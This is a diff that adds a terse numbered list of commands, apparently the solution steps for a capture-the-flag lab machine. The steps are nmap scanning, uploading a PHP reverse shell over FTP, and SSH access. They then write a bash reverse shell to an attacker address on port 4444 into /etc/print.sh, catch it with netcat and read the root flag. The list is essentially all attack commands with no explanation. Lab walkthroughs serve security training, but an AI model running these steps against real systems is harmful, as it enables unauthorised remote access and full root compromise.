@@ -1,0 +1,15 @@
+1 - nmap -A -p- 10.10.151.184
+2 - ftp 10.10.151.184
+3 - cp /usr/share/webshells/php/php-reverse-shell.php .
+4 - ftp 10.10.151.184 -> put php-reverse-shell.php
+5 - cd /incidents , python3 -m http.server 8000
+6 - wireshark suspicious.pcapng
+7 - ssh lennie@10.10.151.184
+8 - cat > /etc/print.sh << EOF
+#!/bin/bash
+bash -i >& /dev/tcp/10.8.94.51/4444 0>&1
+EOF
+9 - nc -lvnp 4444
+10 - sh planner.sh
+11 - whoami
+12 - cat /root/root.txt
